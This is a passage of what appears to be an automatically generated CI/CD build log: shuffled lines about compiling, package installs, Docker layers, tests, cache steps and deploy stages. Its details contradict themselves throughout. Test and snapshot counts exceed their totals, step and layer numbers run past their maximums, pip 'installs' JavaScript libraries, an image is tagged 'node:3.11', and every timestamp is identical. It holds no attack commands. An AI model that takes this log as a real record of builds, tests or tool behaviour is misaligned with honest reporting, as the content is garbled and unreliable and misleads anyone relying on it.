(288MB)\n[12:19:20] INFO: Request completed\nImage pulled successfully\n\u2713 Step 'test' succeeded\nTLS handshake completed\nFAILED: test_cache_hit\nDone.\nOK\nChecking out master branch\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTime: 120.167s\nLoading...\nArtifact uploaded: dist.zip (48MB)\nCompiling components/service.java...\n[12:19:20] DEBUG: Query executed in 10ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nEnvironment: production\nCompiling lib/utils.go...\nCompiling src/service.java...\nPulling image: alpine:18\nStep 11/20: Installing dependencies\nUploading artifact 'build' (2 files)\nDone.\nTransforming 992 files...\nGET /api - 201 (17ms)\nNODE_ENV=test\n[12:19:20] INFO: Processing request\nTransforming 916 files...\nHEAD is now at 990001a\nVerifying...\nTime: 22.292s\n\u2713 Step 'install' succeeded\nWaiting...\nStep 12/18: Testing\n  PASS: test_auth_login (62ms)\nProcessing...\nUsing Python 3.12\n[12:19:20] DEBUG: Memory usage: 1863MB\nFAILED: test_api_health\nUsing Python 3.12\nStep 16/23: Installing dependencies\nStep 7/17: Deploying\nBundling runtime.js\n[12:19:20] WARN: Deprecated API usage\nPOST /api - 201 (81ms)\nReady.\nTest Suites: 41 passed, 7 total\nLoading...\nLayer 9/8: ENV command\nConnecting to test.io:443...\nUploading artifact 'build' (40 files)\nCompiling lib/app.ts...\n[12:19:20] WARN: Deprecated API usage\nLayer 7/11: ENV command\nCache saved successfully\nBuilding Docker image...\n\u2713 Task completed in 3267ms\nGenerating source maps...\nCache miss for key-5748\n  PASS: test_user_create (319ms)\n[12:19:20] ERROR: Connection failed\nImage pulled successfully\nyarn add: Done in 1.56s\nImage pulled successfully\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nEnvironment: production\nnpm notice: created a lockfile\nCompiling src/utils.go...\nBuilding Docker image...\n[12:19:20] ERROR: Connection failed\n\u2713 Step 'setup' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTest Suites: 39 passed, 28 total\n[12:19:20] INFO: Connecting to database\nConnecting to test.io:443...\nFAILED: test_cache_hit\nSuccess!\nTransforming 411 files...\nCompiling components/service.java...\nCompleted.\nArtifact uploaded: dist.zip (56MB)\nnpm notice: created a lockfile\n\u2713 Step 'build' succeeded\nStep 20/21: Building\nFetching submodules...\nStep 12/24: Testing\nVerifying...\n[12:19:20] WARN: Deprecated API usage\n[12:19:20] WARN: Deprecated API usage\nnpm notice: created a lockfile\nCompiling utils/utils.go...\nArtifact downloaded: 10MB\nStep 3/18: Installing dependencies\nException: RuntimeError\nCompleted.\nEnvironment: production\nWARNING: jest has known vulnerabilities\nStep 1/15: Building\nWARNING: webpack has known vulnerabilities\nReady.\nWaiting...\npip: Collecting webpack\nCompiling src/service.java...\nPlatform: win32-x64\nConnection established\nStep 16/23: Deploying\nAlready up to date.\n\u2717 build failed with exit code 15\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling react@2.9.1\n\u2713 test completed\nOptimizing 33 modules...\nSuccess!\nDone.\nArtifact uploaded: dist.zip (70MB)\nCache saved successfully\npip: Installing build dependencies...\nTime: 6.805s\nEnvironment: test\nnpm notice: created a lockfile\n[12:19:20] WARN: Deprecated API usage\nnpm notice: package.json updated\nCompleted.\npip: Installing build dependencies...\nSuccess!\nyarn add: Done in 14.52s\nUsing Node.js 14.12.3\npip install: Successfully installed webpack-4.7\nConnecting to test.io:443...\nEnvironment: development\nPOST /api - 201 (132ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 8/24: Deploying\npip: Collecting express\nStep 6/25: Deploying\nFinished.\nCreating production build...\n[12:19:20] INFO: Processing request\nTime: 11.68s\nDone.\n[12:19:20] DEBUG: Memory usage: 1128MB\nOK\nCache miss for key-1939\nConnecting to test.io:443...\nPushing to registry...\nOK\nLoading...\nCoverage: 87% statements, 85% branches\n\u2713 build completed\nPulling image: alpine:latest\nStep 19/25: Testing\nStep 3/24: Installing dependencies\n\u2717 build failed with exit code 68\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n=== Step upload_artifacts completed ===\n=== Step: restore_cache ===\nTransforming 112 files...\nPlatform: linux-x64\n\u2717 build failed with exit code 73\nSwitched to branch 'feature/task-418'\nRan 135 tests in 28s\npip: Downloading lodash-1.15.tar.gz\n[12:19:20] DEBUG: Query executed in 11ms\nyarn add: Done in 27.0s\nLoading...\nStep 6/25: Running migrations\nTests: 421 passed, 52 total\nStep 14/23: Installing dependencies\nLayer 10/8: ENV command\n\u2713 All checks passed\n\u2713 Task completed in 536ms\nCompiling utils/utils.go...\n  PASS: test_cache_hit (122ms)\nArtifact downloaded: 3MB\nTime: 12.275s\nCoverage: 97% statements, 93% branches\nConnection established\nArtifact uploaded: build.tar.gz (18MB)\npip: Installing build dependencies...\npip: Downloading prettier-4.12.tar.gz\n  PASS: unit/test_api_health.spec.js\nPulling image: node:latest\nCompiling utils/app.ts...\nTime: 72.131s\n[12:19:20] ERROR: Connection failed\nFetching submodules...\n\u2713 lint completed\nCompiling lib/service.java...\npip: Installing build dependencies...\n[12:19:20] DEBUG: Loading configuration\nTransforming 500 files...\nyarn add: Done in 1.13s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nEnvironment: staging\nWARNING: express has known vulnerabilities\n[12:19:20] WARN: Deprecated API usage\nUsing Python 3.10\nImage pulled successfully\nReady.\nRan 87 tests in 15s\nCreating production build...\nnpm notice: package.json updated\nTLS handshake completed\nCreating production build...\nArtifact downloaded: 1MB\npip install: Successfully installed lodash-4.8\nTLS handshake completed\nCompiling components/main.py...\nEnvironment: staging\nChecking out main branch\nStep 17/19: Deploying\nLoading...\nSuccess!\nInstalling lodash@5.4.1\nCache saved successfully\n[12:19:20] DEBUG: Connection pool: 14 active\nnpm notice: created a lockfile\nUploading artifact 'dist' (13 files)\nFetching submodules...\n[12:19:20] INFO: Cache refreshed\nnpm install: added 413 packages\nArtifact uploaded: dist.zip (20MB)\npip: Downloading eslint-3.20.tar.gz\nOK\nCompiling components/handler.rs...\npip install: Successfully installed jest-5.8\nHEAD is now at 0b2c287\n\u2713 Task completed in 2076ms\nCompiling src/handler.rs...\nReady.\nOptimizing 79 modules...\nLoading...\nTests: 444 passed, 386 total\nStep 4/22: Building\n[12:19:20] INFO: Processing request\nCoverage: 86% statements, 92% branches\nBuilding Docker image...\nChecking out main branch\nSuccess!\nCache saved successfully\nEnvironment: development\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nGET /api - 204 (80ms)\nPlatform: win32-x64\npip: Installing build dependencies...\nTests: 278 passed, 271 total\nStep 7/21: Deploying\nGET /api - 204 (83ms)\npip install: Successfully installed prettier-4.15\n\u2713 All checks passed\nLoading...\nWaiting...\nWARNING: react has known vulnerabilities\nCompleted.\nSwitched to branch 'bugfix/task-558'\nPlatform: win32-x64\npip install: Successfully installed lodash-5.8\nWARNING: lodash has known vulnerabilities\nUsing Node.js 18.2.8\nTransforming 638 files...\npip: Downloading webpack-5.15.tar.gz\nCompleted.\n\u2713 build completed\nnpm notice: package.json updated\n\u2713 build completed\n[12:19:20] DEBUG: Connection pool: 13 active\nnpm notice: created a lockfile\n  PASS: integration/test_api_health.spec.js\n  PASS: test_user_create (246ms)\nChecking out main branch\nArtifact downloaded: 9MB\nStep 8/18: Installing dependencies\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTLS handshake completed\n\u2713 All checks passed\nLayer 8/12: ENV command\n[12:19:20] DEBUG: Initializing service\npip: Installing build dependencies...\nStep 17/25: Installing dependencies\nEnvironment: test\nCompiling lib/main.py...\nCache saved successfully\nBundling runtime.css\nnpm notice: created a lockfile\nUsing Node.js 18.11.4\nStep 17/19: Installing dependencies\nCache saved successfully\nVerifying...\nCompleted.\nArtifact downloaded: 8MB\n[12:19:20] ERROR: Connection failed\npip: Downloading jest-4.13.tar.gz\nFAILED: test_user_create\nArtifact uploaded: dist.zip (69MB)\nWaiting...\n[12:19:20] WARN: Deprecated API usage\nHEAD is now at b449b32\n[12:19:20] INFO: Request completed\n[12:19:20] DEBUG: Memory usage: 415MB\nBuilding Docker image...\npip install: Successfully installed lodash-4.1\n[12:19:20] INFO: Connecting to database\nCompiling utils/app.ts...\nStep 5/25: Running migrations\n[12:19:20] INFO: Starting build process\nCache restored successfully (141MB)\n\u2713 Task completed in 4219ms\nCache saved successfully\nConnecting to example.com:443...\nTests: 161 passed, 457 total\npip: Installing build dependencies...\nTransforming 385 files...\nMinifying main.js\n[12:19:20] WARN: Deprecated API usage\nStep 8/17: Testing\nBundling main.css\nHEAD is now at d5c7c61\nFetching submodules...\nCache restored successfully (181MB)\n[12:19:20] WARN: Deprecated API usage\nTLS handshake completed\nFinished.\nnpm install: added 66 packages\nStep 10/20: Building\nWARNING: webpack has known vulnerabilities\npip install: Successfully installed eslint-1.10\nCache hit for key-7801\nArtifact uploaded: build.tar.gz (31MB)\nVerifying...\nBundling runtime.js\nCompiling utils/main.py...\nTests: 267 passed, 247 total\nSuccess!\nArtifact uploaded: dist.zip (26MB)\n[12:19:20] INFO: Cache refreshed\n[12:19:20] DEBUG: Query executed in 40ms\nCreating production build...\nConnection established\nCoverage: 77% statements, 92% branches\nPushing to registry...\n[12:19:20] WARN: Deprecated API usage\nPlatform: darwin-arm64\nDone.\nGenerating source maps...\nFAILED: test_user_create\n  PASS: test_auth_login (292ms)\n[12:19:20] DEBUG: Connection pool: 8 active\nWARNING: webpack has known vulnerabilities\nArtifact uploaded: build.tar.gz (41MB)\nnpm notice: created a lockfile\n[12:19:20] INFO: Cache refreshed\nInstalling axios@5.6.10\n[12:19:20] INFO: Cache refreshed\npip: Collecting jest\n[12:19:20] DEBUG: Initializing service\nNODE_ENV=development\nArtifact uploaded: dist.zip (78MB)\n[12:19:20] WARN: Deprecated API usage\nBundling main.js\nChecking out main branch\nFetching submodules...\nMinifying main.js\nBundling main.css\n[12:19:20] INFO: Processing request\n[12:19:20] DEBUG: Memory usage: 1093MB\n\u2713 Step 'install' succeeded\nCache restored successfully (170MB)\nCompiling src/service.java...\npip install: Successfully installed lodash-5.19\n[12:19:20] INFO: Processing request\npip: Installing build dependencies...\nArtifact downloaded: 15MB\nyarn add: Done in 29.87s\nPlatform: darwin-arm64\nStep 7/18: Building\nWaiting...\nBuilding Docker image...\nStep 19/22: Deploying\nStep 3/16: Installing dependencies\nTests: 311 passed, 145 total\nCompleted.\nOptimizing 92 modules...\nGET /health - 200 (4ms)\nFetching submodules...\nCompiling src/main.py...\npip: Installing build dependencies...\n[12:19:20] INFO: Cache refreshed\n[12:19:20] DEBUG: Query executed in 21ms\nProcessing...\n\u2713 test completed\nArtifact downloaded: 22MB\nFAILED: test_db_connect\nGET /health - 204 (35ms)\n=== Step restore_cache completed ===\n=== Step: type_check ===\n\u2713 Step 'install' succeeded\n\u2717 build failed with exit code 10\n[12:19:20] WARN: Deprecated API usage\nConnecting to cloud.services:443...\nNODE_ENV=development\nHEAD is now at 45b363a\n[12:19:20] INFO: Cache refreshed\n  PASS: test_api_health (290ms)\npip: Downloading lodash-1.5.tar.gz\nLoading...\nConnection established\nUploading artifact 'build' (21 files)\nWARNING: webpack has known vulnerabilities\nTest Suites: 23 passed, 34 total\n[12:19:20] DEBUG: Connection pool: 16 active\nTransforming 994 files...\npip: Downloading lodash-4.16.tar.gz\nHEAD is now at 79bfcfd\nCompiling src/main.py...\nStep 7/22: Installing dependencies\n[12:19:20] WARN: Deprecated API usage\nTests: 340 passed, 89 total\nLoading...\nVerifying...\n[12:19:20] INFO: Request completed\nWARNING: prettier has known vulnerabilities\nCompiling components/main.py...\nWARNING: express has known vulnerabilities\nFetching submodules...\nOK\nBundling vendor.css\nAlready up to date.\nPulling image: alpine:3.11\nGET /status - 201 (62ms)\n[12:19:20] DEBUG: Loading configuration\n[12:19:20] INFO: Cache refreshed\nHEAD is now at d7fcf7a\nNODE_ENV=test\nUsing Python 3.9\nWaiting...\nCache miss for key-7380\npip install: Successfully installed express-4.16\nnpm install: added 404 packages\nUsing Node.js 14.8.9\n[12:19:20] DEBUG: Query executed in 38ms\n[12:19:20] INFO: Starting build process\nCompiling src/handler.rs...\nImage pulled successfully\nBuilding Docker image...\nUsing Python 3.11\n[12:19:20] INFO: Processing request\nSwitched to branch 'bugfix/task-899'\nTLS handshake completed\nCache saved successfully\nHEAD is now at a021d3a\nTest Suites: 40 passed, 14 total\nCompiling components/utils.go...\nStep 5/18: Installing dependencies\nTime: 24.566s\nCoverage: 77% statements, 75% branches\nTime: 28.622s\nCreating production build...\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:20] WARN: Deprecated API usage\nPulling image: python:3.11\nOptimizing 58 modules...\n  PASS: test_cache_hit (420ms)\nMinifying vendor.js\nMinifying vendor.js\n[12:19:20] DEBUG: Memory usage: 938MB\nUploading artifact 'coverage' (39 files)\nStep 2/22: Linting\n[12:19:20] DEBUG: Loading configuration\n[12:19:20] DEBUG: Connection pool: 9 active\nSuccess!\npip install: Successfully installed express-4.13\nStep 11/21: Installing dependencies\n[12:19:20] ERROR: Connection failed\n[12:19:20] DEBUG: Initializing service\nCompiling components/handler.rs...\n[12:19:20] DEBUG: Memory usage: 1771MB\nCompiling utils/index.js...\nGenerating source maps...\nCompiling utils/utils.go...\nLoading...\nChecking out develop branch\n[12:19:20] INFO: Starting build process\nTests: 60 passed, 284 total\nCreating production build...\nChecking out master branch\nTest Suites: 29 passed, 21 total\nUsing Node.js 20.5.8\n\u2713 All checks passed\n[12:19:20] INFO: Request completed\nArtifact downloaded: 40MB\nInstalling axios@5.15.9\nArtifact uploaded: build.tar.gz (17MB)\n[12:19:20] DEBUG: Memory usage: 206MB\nCoverage: 72% statements, 88% branches\n\u2713 All checks passed\n\u2713 Step 'setup' succeeded\nOptimizing 54 modules...\npip: Installing build dependencies...\nFAILED: test_cache_hit\nArtifact downloaded: 4MB\nAlready up to date.\nReady.\nDone.\n[12:19:20] INFO: Request completed\nTests: 89 passed, 115 total\nPlatform: linux-x64\nTest Suites: 12 passed, 29 total\nCompiling components/handler.rs...\nArtifact uploaded: dist.zip (85MB)\nPlatform: win32-x64\nStep 7/20: Testing\n[12:19:20] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (11MB)\nnpm notice: package.json updated\nConnecting to cloud.services:443...\n[12:19:20] ERROR: Connection failed\nUploading artifact 'coverage' (22 files)\n\u2713 All checks passed\n[12:19:20] INFO: Request completed\nTest Suites: 5 passed, 29 total\nTransforming 231 files...\nCompiling src/utils.go...\nGenerating source maps...\nOptimizing 74 modules...\nStep 16/23: Linting\nPOST /api - 202 (302ms)\nVerifying...\nUsing Node.js 15.0.4\nUsing Node.js 14.1.8\nMinifying vendor.js\nFinished.\nTLS handshake completed\n[12:19:20] DEBUG: Loading configuration\nConnecting to test.io:443...\nnpm install: added 218 packages\nnpm notice: package.json updated\n[12:19:20] INFO: Starting build process\nnpm install: resolved 1297 packages\nSwitched to branch 'hotfix/task-781'\nSuccess!\nAlready up to date.\nGenerating source maps...\nDone.\n\u2713 Task completed in 2674ms\nStep 17/18: Installing dependencies\nWARNING: webpack has known vulnerabilities\n  PASS: test_auth_login (425ms)\nCompiling src/utils.go...\nCache restored successfully (291MB)\nnpm notice: created a lockfile\nLayer 7/11: COPY command\n[12:19:20] INFO: Processing request\nGenerating source maps...\nOptimizing 94 modules...\nStep 13/21: Installing dependencies\npip: Collecting express\n\u2717 build failed with exit code 32\nInstalling webpack@5.1.5\nArtifact uploaded: build.tar.gz (38MB)\nUploading artifact 'build' (31 files)\nStep 20/15: Running migrations\n[12:19:20] INFO: Request completed\nPulling image: alpine:latest\nCompleted.\n  PASS: integration/test_auth_login.spec.js\nCache restored successfully (326MB)\nProcessing...\nPOST /data - 202 (490ms)\nStep 13/23: Building\n[12:19:20] INFO: Processing request\nCache saved successfully\n  PASS: test_api_health (459ms)\nGET /api - 200 (9ms)\n[12:19:20] INFO: Processing request\nReady.\n\u2713 Step 'test' succeeded\nnpm notice: package.json updated\n\u2717 build failed with exit code 90\nTime: 72.627s\nCache miss for key-1422\nAlready up to date.\nCache invalidated: build\nStep 6/18: Running migrations\nReady.\nChecking out develop branch\nnpm install: resolved 1010 packages\nUploading artifact 'coverage' (42 files)\nCompiling utils/utils.go...\nNODE_ENV=production\nStep 17/23: Linting\nSuccess!\n[12:19:20] DEBUG: Connection pool: 8 active\nUploading artifact 'build' (12 files)\n\u2713 All checks passed\nArtifact downloaded: 10MB\nStep 18/17: Building\nPushing to registry...\npip: Collecting prettier\nTime: 54.962s\n  PASS: e2e/test_api_health.spec.js\nArtifact uploaded: dist.zip (62MB)\nBundling styles.js\n[12:19:20] INFO: Connecting to database\n[12:19:20] DEBUG: Connection pool: 16 active\nSuccess!\n[12:19:20] INFO: Processing request\nCreating production build...\nPlatform: linux-x64\nEnvironment: staging\n\u2713 Step 'setup' succeeded\nBundling vendor.js\nInstalling eslint@5.6.2\nCompiling src/handler.rs...\nArtifact downloaded: 13MB\n  PASS: test_api_health (77ms)\npip: Installing build dependencies...\n  PASS: unit/test_auth_login.spec.js\n[12:19:20] DEBUG: Loading configuration\nTime: 34.445s\nyarn add: Done in 12.74s\n\u2713 All checks passed\nnpm install: added 497 packages\nOptimizing 64 modules...\nOK\n  PASS: test_db_connect (387ms)\npip: Downloading react-2.3.tar.gz\nyarn add: Done in 8.52s\nCache hit for key-7062\nyarn add: Done in 3.25s\nConnection established\nPOST /data - 201 (166ms)\nMinifying vendor.js\n=== Step type_check completed ===\n=== Step: deploy_production ===\npip: Collecting jest\nArtifact downloaded: 21MB\nChecking out master branch\nConnecting to startup.dev:443...\nStep 17/16: Building\nChecking out develop branch\nChecking out master branch\nLoading...\nTests: 204 passed, 144 total\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nVerifying...\nLayer 4/15: COPY command\nCache invalidated: node_modules\nArtifact uploaded: build.tar.gz (20MB)\nRan 155 tests in 6s\nCache miss for key-3901\nUsing Python 3.10\nTLS handshake completed\n[12:19:20] DEBUG: Query executed in 75ms\nCache invalidated: node_modules\nPushing to registry...\nWARNING: prettier has known vulnerabilities\nConnection established\nProcessing...\nLayer 4/9: COPY command\nGenerating source maps...\nArtifact uploaded: dist.zip (91MB)\n\u2713 Step 'setup' succeeded\n\u2713 test completed\nSnapshots: 19 passed, 40 total\n[12:19:20] WARN: Deprecated API usage\nCache miss for key-5615\nyarn add: Done in 7.73s\n[12:19:20] WARN: Deprecated API usage\n[12:19:20] INFO: Request completed\nPulling image: node:3.11\nInstalling prettier@2.11.4\nArtifact downloaded: 7MB\nBundling styles.js\nFetching submodules...\nBuilding Docker image...\nSnapshots: 42 passed, 24 total\nUsing Python 3.12\nStep 20/21: Testing\nSnapshots: 42 passed, 6 total\n[12:19:20] DEBUG: Loading configuration\nConnection established\nCompleted.\npip: Installing build dependencies...\nStep 20/24: Building\nTime: 67.745s\nStep 4/23: Deploying\nLoading...\nOK\nyarn add: Done in 29.89s\nLayer 9/13: ENV command\nCache saved successfully\nCompiling src/app.ts...\nCompiling components/utils.go...\nnpm install: added 350 packages\nMinifying app.js\npip: Downloading axios-4.14.tar.gz\nUsing Node.js 20.8.5\nWaiting...\nStep 14/18: Deploying\nReady.\nTest Suites: 15 passed, 47 total\nStep 14/16: Testing\nnpm install: added 296 packages\nException: TypeError\nGET /health - 201 (34ms)\nConnection established\n[12:19:20] INFO: Request completed\nSuccess!\nOptimizing 14 modules...\nSuccess!\nCache invalidated: build\nOptimizing 46 modules...\n[12:19:20] INFO: Processing request\nStep 12/21: Deploying\nArtifact downloaded: 49MB\n[12:19:20] INFO: Request completed\nArtifact downloaded: 25MB\nnpm notice: package.json updated\nBundling runtime.css\npip: Installing build dependencies...\nCompiling utils/service.java...\nTests: 412 passed, 57 total\npip: Collecting express\nGET /api - 200 (38ms)\nSnapshots: 3 passed, 19 total\nSnapshots: 6 passed, 25 total\nAlready up to date.\nGenerating source maps...\nInstalling prettier@5.20.7\n\u2713 All checks passed\nGET /status - 201 (57ms)\nCache miss for key-8368\nnpm notice: created a lockfile\npip install: Successfully installed jest-4.3\nStep 1/19: Deploying\nSuccess!\nSnapshots: 19 passed, 19 total\nBundling runtime.js\nStep 20/23: Installing dependencies\nStep 4/16: Deploying\nConnecting to cloud.services:443...\n\u2713 All checks passed\npip install: Successfully installed react-5.12\n[12:19:20] INFO: Processing request\npip: Installing build dependencies...\n\u2713 build completed\nTLS handshake completed\nTests: 171 passed, 61 total\nCompiling src/handler.rs...\npip: Installing build dependencies...\nCache invalidated: dependencies\nMinifying app.js\nCache hit for key-4484\nDone.\nConnection established\nBundling main.css\nFinished.\nCompleted.\n[12:19:20] INFO: Cache refreshed\nWaiting...\nUsing Node.js 18.20.2\nVerifying...\nTime: 105.583s\nProcessing...\nWARNING: react has known vulnerabilities\n[12:19:20] WARN: Deprecated API usage\n  PASS: test_api_health (311ms)\n[12:19:20] INFO: Request completed\n[12:19:20] INFO: Connecting to database\nWaiting...\nLoading...\nyarn add: Done in 18.30s\nStep 9/18: Installing dependencies\nTest Suites: 10 passed, 33 total\n[12:19:20] INFO: Connecting to database\n[12:19:20] INFO: Request completed\nStep 4/15: Deploying\nProcessing...\nCompiling utils/handler.rs...\nFinished.\nOK\nFinished.\n\u2713 Step 'install' succeeded\nGenerating source maps...\nCache invalidated: dependencies\n[12:19:20] DEBUG: Memory usage: 532MB\npip: Installing build dependencies...\nSwitched to branch 'hotfix/task-961'\nCreating production build...\nnpm install: resolved 1836 packages\n[12:19:20] WARN: Deprecated API usage\nStep 5/23: Building\nStep 16/25: Building\nFinished.\nStep 5/19: Installing dependencies\n[12:19:20] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/utils.go...\nCreating production build...\nInstalling lodash@5.1.10\nTLS handshake completed\nChecking out develop branch\nOK\nDone.\n\u2713 Step 'install' succeeded\nAlready up to date.\n  PASS: test_db_connect (477ms)\nPlatform: darwin-arm64\nOptimizing 76 modules...\nTime: 38.158s\nTests: 151 passed, 438 total\nTLS handshake completed\nBuilding Docker image...\nCoverage: 87% statements, 97% branches\n\u2713 Task completed in 4376ms\npip install: Successfully installed lodash-4.13\nVerifying...\nTests: 319 passed, 100 total\nLoading...\n  PASS: test_auth_login (294ms)\nBuilding Docker image...\n[12:19:20] INFO: Connecting to database\n\u2713 All checks passed\nPulling image: alpine:3.11\nPlatform: darwin-arm64\npip: Installing build dependencies...\nLoading...\nOK\nChecking out main branch\n[12:19:20] INFO: Request completed\n  PASS: test_user_create (167ms)\n[12:19:20] DEBUG: Query executed in 30ms\nOK\npip: Installing build dependencies...\n[12:19:20] DEBUG: Query executed in 22ms\nCompiling src/utils.go...\npip: Downloading webpack-5.15.tar.gz\nSwitched to branch 'hotfix/task-599'\nCompiling src/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:20] INFO: Request completed\nWARNING: eslint has known vulnerabilities\nCompiling components/index.js...\npip install: Successfully installed axios-5.13\nTransforming 900 files...\nOK\nCompleted.\n\u2713 Task completed in 2383ms\nBuilding Docker image...\nCache restored successfully (17MB)\nCache hit for key-5878\nEnvironment: staging\n[12:19:20] DEBUG: Memory usage: 562MB\nCreating production build...\nCache saved successfully\nCompiling lib/index.js...\nCompiling components/service.java...\nNODE_ENV=development\nEnvironment: test\nLoading...\n[12:19:20] DEBUG: Query executed in 43ms\nEnvironment: development\n\u2713 All checks passed\nLoading...\nnpm notice: package.json updated\nOptimizing 76 modules...\nBuilding Docker image...\nCompiling utils/handler.rs...\nCompleted.\nTime: 72.361s\n=== Step deploy_production completed ===\n=== Step: integration_tests ===\nBundling runtime.js\nBuilding Docker image...\nUsing Python 3.11\nException: ValueError\nCompiling components/handler.rs...\npip: Installing build dependencies...\n[12:19:20] DEBUG: Query executed in 72ms\nDone.\nException: NullPointerException\nCache restored successfully (166MB)\nArtifact downloaded: 18MB\nTransforming 616 files...\nEnvironment: staging\nFAILED: test_user_create\nSwitched to branch 'bugfix/task-297'\nCompleted.\nCache hit for key-1543\n\u2717 build failed with exit code 105\nFAILED: test_api_health\nDone.\nWARNING: jest has known vulnerabilities\nCompiling src/utils.go...\nGET /status - 204 (18ms)\nStep 17/24: Building\nTime: 113.416s\nMinifying vendor.js\n\u2713 Step 'build' succeeded\nCache hit for key-1230\nStep 15/15: Installing dependencies\nCache saved successfully\n[12:19:20] DEBUG: Initializing service\n[12:19:20] DEBUG: Initializing service\nLayer 5/8: RUN command\nSwitched to branch 'hotfix/task-205'\n[12:19:20] WARN: Deprecated API usage\n\u2713 Step 'checkout' succeeded\nStep 3/18: Building\nUsing Node.js 20.8.5\nBundling runtime.js\nnpm install: resolved 524 packages\nWaiting...\nTime: 99.334s\nCache miss for key-5063\nOK\n[12:19:20] WARN: Deprecated API usage\nOptimizing 75 modules...\nPOST /upload - 200 (483ms)\n[12:19:20] ERROR: Connection failed\nGenerating source maps...\nCreating production build...\npip: Downloading lodash-3.16.tar.gz\nnpm install: added 436 packages\n[12:19:20] INFO: Connecting to database\n[12:19:20] INFO: Cache refreshed\nPushing to registry...\n[12:19:20] DEBUG: Loading configuration\nnpm notice: created a lockfile\nSnapshots: 32 passed, 41 total\nTransforming 581 files...\n\u2713 All checks passed\n[12:19:20] INFO: Connecting to database\n\u2713 All checks passed\nOptimizing 42 modules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLayer 3/15: COPY command\nArtifact uploaded: dist.zip (29MB)\nBundling styles.js\nProcessing...\nImage pulled successfully\nTime: 1.713s\nCoverage: 87% statements, 86% branches\nOK\nyarn add: Done in 23.16s\nStep 13/25: Installing dependencies\nAlready up to date.\nStep 16/16: Running migrations\nFinished.\nArtifact uploaded: dist.zip (39MB)\nBuilding Docker image...\n\u2713 test completed\nRan 10 tests in 50s\nFinished.\nTime: 115.240s\nVerifying...\n[12:19:20] DEBUG: Memory usage: 1020MB\nConnection established\nCache restored successfully (57MB)\nHEAD is now at 34cc079\n[12:19:20] WARN: Deprecated API usage\nTLS handshake completed\n[12:19:20] DEBUG: Loading configuration\nnpm install: resolved 805 packages\n[12:19:20] DEBUG: Initializing service\nTime: 88.89s\nImage pulled successfully\nHEAD is now at 0aee7b7\nyarn add: Done in 11.36s\nBundling vendor.css\nArtifact downloaded: 28MB\nSnapshots: 43 passed, 13 total\nWARNING: express has known vulnerabilities\nPulling image: alpine:latest\nStep 15/25: Deploying\nPlatform: linux-x64\nCache restored successfully (221MB)\n[12:19:20] DEBUG: Connection pool: 2 active\nTLS handshake completed\nTime: 106.624s\nWaiting...\nConnecting to startup.dev:443...\nChecking out master branch\nChecking out main branch\nCache restored successfully (259MB)\nLayer 5/11: COPY command\nDone.\n\u2713 test completed\n[12:19:20] INFO: Connecting to database\nStep 11/18: Installing dependencies\npip: Installing build dependencies...\n[12:19:20] INFO: Starting build process\nLayer 4/11: RUN command\nFAILED: test_db_connect\n[12:19:20] DEBUG: Query executed in 79ms\nPlatform: darwin-arm64\nLoading...\nSwitched to branch 'bugfix/task-904'\nOptimizing 79 modules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:19:20] INFO: Cache refreshed\nCreating production build...\nStep 8/25: Building\nCreating production build...\nAlready up to date.\nUploading artifact 'dist' (3 files)\nPlatform: linux-x64\nWARNING: express has known vulnerabilities\nCompiling utils/utils.go...\n[12:19:20] DEBUG: Initializing service\nCache restored successfully (158MB)\nCache invalidated: dependencies\nPushing to registry...\nCompiling utils/main.py...\nStep 1/17: Linting\n\u2713 Task completed in 1944ms\nCompiling components/service.java...\nnpm install: resolved 1172 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache miss for key-2820\nArtifact uploaded: dist.zip (19MB)\nConnection established\nBuilding Docker image...\nStep 3/23: Building\n\u2713 Task completed in 1228ms\nnpm notice: created a lockfile\nFetching submodules...\npip: Downloading express-1.17.tar.gz\nStep 5/19: Running migrations\n[12:19:20] DEBUG: Query executed in 65ms\n\u2717 build failed with exit code 124\nStep 13/23: Deploying\nOptimizing 88 modules...\nSuccess!\nConnecting to test.io:443...\nSnapshots: 14 passed, 19 total\nStep 10/18: Running migrations\n\u2713 All checks passed\nCompleted.\nMinifying vendor.js\n\u2717 build failed with exit code 122\nWaiting...\nTest Suites: 44 passed, 17 total\nnpm notice: created a lockfile\nProcessing...\n[12:19:20] DEBUG: Connection pool: 7 active\npip: Installing build dependencies...\nCache invalidated: dependencies\nFinished.\nWaiting...\nTransforming 500 files...\nCompiling src/service.java...\nnpm install: added 210 packages\nCache saved successfully\nAlready up to date.\n[12:19:20] INFO: Request completed\npip: Downloading lodash-4.10.tar.gz\nnpm install: added 323 packages\nnpm notice: package.json updated\nVerifying...\nLayer 8/11: ENV command\nWARNING: lodash has known vulnerabilities\nOptimizing 76 modules...\n[12:19:20] DEBUG: Memory usage: 1347MB\nCompiling utils/utils.go...\nConnection established\n\u2713 validate completed\nCache hit for key-4723\nGenerating source maps...\nGET /status - 201 (52ms)\npip install: Successfully installed eslint-2.20\nStep 20/21: Testing\nTransforming 786 files...\npip: Installing build dependencies...\nUsing Node.js 17.0.2\nImage pulled successfully\nCompiling utils/index.js...\nPlatform: darwin-arm64\nSwitched to branch 'hotfix/task-313'\nArtifact uploaded: build.tar.gz (15MB)\nCache restored successfully (14MB)\n\u2713 Task completed in 3532ms\nGenerating source maps...\n\u2717 build failed with exit code 124\nCache miss for key-4004\nCreating production build...\nBuilding Docker image...\nStep 12/15: Linting\nFetching submodules...\nStep 6/24: Installing dependencies\n[12:19:20] DEBUG: Loading configuration\nTime: 